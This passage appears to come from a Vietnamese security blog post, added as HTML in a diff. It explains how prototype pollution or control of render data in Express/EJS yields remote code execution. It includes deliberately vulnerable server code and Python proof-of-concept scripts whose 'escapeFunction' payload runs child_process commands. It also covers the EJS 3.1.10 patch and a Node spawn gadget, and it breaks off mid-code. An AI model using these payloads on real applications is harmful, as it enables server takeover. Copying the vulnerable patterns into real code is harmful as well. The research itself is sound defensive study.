+            style="text-decoration-line: none !important;" href="#poc-" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Server.js :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;body-parser&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Set EJS as the template engine
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;view engine&#39;</span><span class="p">,</span> <span class="s1">&#39;ejs&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Set the views directory
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;views&#39;</span><span class="p">,</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;views&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">&#34;/pollute_me&#34;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Prototype pollution vulnerability here
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nb">Object</span><span class="p">.</span><span class="nx">assign</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">({}.</span><span class="nx">client</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;Updated!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Define a simple route
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">title</span><span class="o">:</span> <span class="s1">&#39;Hello EJS&#39;</span><span class="p">,</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;Welcome to EJS Template!&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Start the server
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">PORT</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">PORT</span> <span class="o">||</span> <span class="mi">3000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">PORT</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Server running on http://localhost:</span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>ex.py  :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span>  <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://localhost:3000&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">escapeFunction</span> <span class="o">=</span> <span class="s2">&#34;JSON.stringify; console.log(1337);let cp = process.mainModule.require(&#39;child_process&#39;);console.log(cp.execSync(&#39;id&#39;).toString());&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span>  <span class="o">=</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;client&#34;</span> <span class="p">:</span> <span class="s1">&#39;123&#39;</span> <span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;escapeFunction&#34;</span> <span class="p">:</span> <span class="n">escapeFunction</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s1">&#39;/pollute_me&#39;</span> <span class="p">,</span><span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span></code></pre></div><p><em>Express views use a default config when calling templating function, which make it vulnerable by default!</em></p>
+
+
+<h1 class="relative group">Another gadget : 
+    <div id="another-gadget-" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#another-gadget-" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+<ul>
+<li>Sẽ ra sao nếu ta không có prototype pollution nhưng có thể handle được biến data ?
+Khi express gọi tới render bản chất nó sẽ gọi tới <strong>export.__express</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">   <span class="c1">// default engine export
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">var</span> <span class="nx">fn</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="nx">mod</span><span class="p">).</span><span class="nx">__express</span>
+</span></span></code></pre></div><p>Ejs :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * Express.js support.
+</span></span></span><span class="line"><span class="cl"><span class="cm"> *
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * This is an alias for {@link module:ejs.renderFile}, in order to support
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * Express.js out-of-the-box.
+</span></span></span><span class="line"><span class="cl"><span class="cm"> *
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * @func
+</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">exports</span><span class="p">.</span><span class="nx">__express</span> <span class="o">=</span> <span class="nx">exports</span><span class="p">.</span><span class="nx">renderFile</span><span class="p">;</span>
+</span></span></code></pre></div><p>Vậy bản chất của express sẽ gọi tới hàm renderFile :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">exports</span><span class="p">.</span><span class="nx">renderFile</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">args</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">slice</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">arguments</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">filename</span> <span class="o">=</span> <span class="nx">args</span><span class="p">.</span><span class="nx">shift</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">cb</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">opts</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">filename</span><span class="o">:</span> <span class="nx">filename</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">viewOpts</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">// Do we have a callback?
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">arguments</span><span class="p">[</span><span class="nx">arguments</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;function&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">cb</span> <span class="o">=</span> <span class="nx">args</span><span class="p">.</span><span class="nx">pop</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// Do we have data/opts?
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="nx">args</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Should always have data obj
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">data</span> <span class="o">=</span> <span class="nx">args</span><span class="p">.</span><span class="nx">shift</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Normal passed opts (data obj + opts obj)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">args</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// Use shallowCopy so we don&#39;t pollute passed in opts obj with new vals
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">utils</span><span class="p">.</span><span class="nx">shallowCopy</span><span class="p">(</span><span class="nx">opts</span><span class="p">,</span> <span class="nx">args</span><span class="p">.</span><span class="nx">pop</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Special casing for Express (settings + opts-in-data)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// Express 3 and 4
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">if</span> <span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">settings</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Pull a few things from known locations
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">settings</span><span class="p">.</span><span class="nx">views</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nx">opts</span><span class="p">.</span><span class="nx">views</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">settings</span><span class="p">.</span><span class="nx">views</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">settings</span><span class="p">[</span><span class="s1">&#39;view cache&#39;</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nx">opts</span><span class="p">.</span><span class="nx">cache</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Undocumented after Express 2, but still usable, esp. for
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// items that are unsafe to be passed along with data, like `root`
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">viewOpts</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">settings</span><span class="p">[</span><span class="s1">&#39;view options&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">viewOpts</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nx">utils</span><span class="p">.</span><span class="nx">shallowCopy</span><span class="p">(</span><span class="nx">opts</span><span class="p">,</span> <span class="nx">viewOpts</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// Express 2 and lower, values set in app.locals, or people who just
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">// want to pass options in their data. NOTE: These values will override
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">// anything previously set in settings  or settings[&#39;view options&#39;]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">utils</span><span class="p">.</span><span class="nx">shallowCopyFromList</span><span class="p">(</span><span class="nx">opts</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="nx">_OPTS_PASSABLE_WITH_DATA_EXPRESS</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">opts</span><span class="p">.</span><span class="nx">filename</span> <span class="o">=</span> <span class="nx">filename</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">data</span> <span class="o">=</span> <span class="nx">utils</span><span class="p">.</span><span class="nx">createNullProtoObjWherePossible</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">tryHandleCache</span><span class="p">(</span><span class="nx">opts</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="nx">cb</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></div><p>Hàm này khá tương đồng với hàm render bình thường nhưng sẽ có vài điểm đặc biệt đó là :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">        <span class="nx">viewOpts</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">settings</span><span class="p">[</span><span class="s1">&#39;view options&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">viewOpts</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nx">utils</span><span class="p">.</span><span class="nx">shallowCopy</span><span class="p">(</span><span class="nx">opts</span><span class="p">,</span> <span class="nx">viewOpts</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span></code></pre></div><ul>
+<li>Ta có thể thấy ở đây , data có thể ảnh hưởng trực tiếp tới biến <strong>opts</strong>  và từ đó chẳng khác gì ta có thể kiểm soát biển opts và lấy rce .</li>
+</ul>
+
+
+<h3 class="relative group">POC : 
+    <div id="poc--1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#poc--1" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>server.js :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;body-parser&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Set EJS as the template engine
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;view engine&#39;</span><span class="p">,</span> <span class="s1">&#39;ejs&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Set the views directory
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;views&#39;</span><span class="p">,</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;views&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">&#34;/pollute_me&#34;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Prototype pollution vulnerability here
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">title</span><span class="o">:</span> <span class="s1">&#39;Hello EJS&#39;</span><span class="p">,</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;Welcome to EJS Template!&#39;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">Object</span><span class="p">.</span><span class="nx">assign</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Define a simple route
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">title</span><span class="o">:</span> <span class="s1">&#39;Hello EJS&#39;</span><span class="p">,</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;Welcome to EJS Template!&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Start the server
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">PORT</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">PORT</span> <span class="o">||</span> <span class="mi">3000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">PORT</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Server running on http://localhost:</span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>ex.py :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">import</span>  <span class="nx">requests</span>
+</span></span><span class="line"><span class="cl"><span class="nx">url</span> <span class="o">=</span> <span class="s2">&#34;http://localhost:3000&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">escapeFunction</span> <span class="o">=</span> <span class="s2">&#34;JSON.stringify; console.log(1337);let cp = process.mainModule.require(&#39;child_process&#39;);console.log(cp.execSync(&#39;id&#39;).toString());&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">data</span>  <span class="o">=</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;settings&#34;</span> <span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;view options&#34;</span> <span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">         <span class="s2">&#34;client&#34;</span> <span class="o">:</span> <span class="s1">&#39;123&#39;</span> <span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;escapeFunction&#34;</span> <span class="o">:</span> <span class="nx">escapeFunction</span>       
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">res</span> <span class="o">=</span> <span class="nx">requests</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">url</span><span class="o">+</span><span class="s1">&#39;/pollute_me&#39;</span> <span class="p">,</span><span class="nx">json</span><span class="o">=</span><span class="nx">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">print</span><span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">requests</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
+</span></span></code></pre></div><ul>
+<li><strong>Lưu ý</strong>:  gadget trên chỉ hoạt động khi kiểm soát được property trực tiếp của data chứ không phải proottype pollution vì khi parse <strong>renderOptions</strong> , nó chỉ copy các own property thui chứ không dùng luôn cả objects đấy.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">renderOptions</span> <span class="o">=</span> <span class="p">{</span> <span class="p">...</span><span class="k">this</span><span class="p">.</span><span class="nx">locals</span><span class="p">,</span> <span class="p">...</span><span class="nx">opts</span><span class="p">.</span><span class="nx">_locals</span><span class="p">,</span> <span class="p">...</span><span class="nx">opts</span> <span class="p">};</span>
+</span></span></code></pre></div>
+
+<h1 class="relative group">How it get patched 
+    <div id="how-it-get-patched" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#how-it-get-patched" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+<ul>
+<li>Vì root cause ở đây là do hàm generate Template function nhận opts mà không kiểm tra kĩ nên patch đơn giản nhưu sau  :
+<a href="https://github.com/mde/ejs/compare/v3.1.9%2e%2e%2ev3.1.10" target="_blank">https://github.com/mde/ejs/compare/v3.1.9%2e%2e%2ev3.1.10</a>
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/BJ7m3GkOee.png" alt="image" />
+    
+  </figure>
+</li>
+</ul>
+<p>Nó sẽ kiểm tra các biến có phải là property trực tiếp hay không sau đó trả copy vào một Null Object và returns về . Không biết có bypass đc ko :v
+Nhìn chung nếu ta có thể kiểm soát biến data (not prototype pollution) thì rce vẫn posssible .</p>
+
+
+<h1 class="relative group">Universal Gadget 
+    <div id="universal-gadget" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#universal-gadget" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+<p><a href="https://portswigger.net/web-security/prototype-pollution/server-side" target="_blank">https://portswigger.net/web-security/prototype-pollution/server-side</a></p>
+<ul>
+<li>Ngoài ra có một gadget khá nguy hiểm đối với các phiên bản Node js cũ khi spawn một process mới .</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">spawn</span><span class="p">(</span><span class="nx">file</span><span class="p">,</span> <span class="nx">args</span><span class="p">,</span> <span class="nx">options</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">child</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ChildProcess</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">options</span> <span class="o">=</span> <span class="nx">normalizeSpawnArguments</span><span class="p">(</span><span class="nx">file</span><span class="p">,</span> <span class="nx">args</span><span class="p">,</span> <span class="nx">options</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">debug</span><span class="p">(</span><span class="s1">&#39;spawn&#39;</span><span class="p">,</span> <span class="nx">options</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">child</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="nx">options</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">child</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Hàm trên sẽ tạo một process và truyền options được lấy từ <strong>normalizeSpawnArguments</strong>
+Vấn đề ở đây là hàm trên có một bug về pp .</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-j" data-lang="j"><span class="line"><span class="cl">    <span class="nv">const</span> <span class="nv">env</span> <span class="o">=</span> <span class="nv">options</span><span class="o">.</span><span class="nv">env</span> <span class="o">||</span> <span class="nv">process</span><span class="o">.</span><span class="nv">env</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">const</span> <span class="nv">envPairs</span> <span class="o">=</span> <span class="o">[];</span>
+</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="nv">Prototype</span> <span class="nv">values</span> <span class="nv">are</span> <span class="nv">intentionally</span> <span class="nv">included</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">for</span> <span class="p">(</span><span class="nv">const</span> <span class="nv">key</span> <span class="nv">in</span> <span class="nv">env</span><span class="p">)</span> <span class="o">{</span>
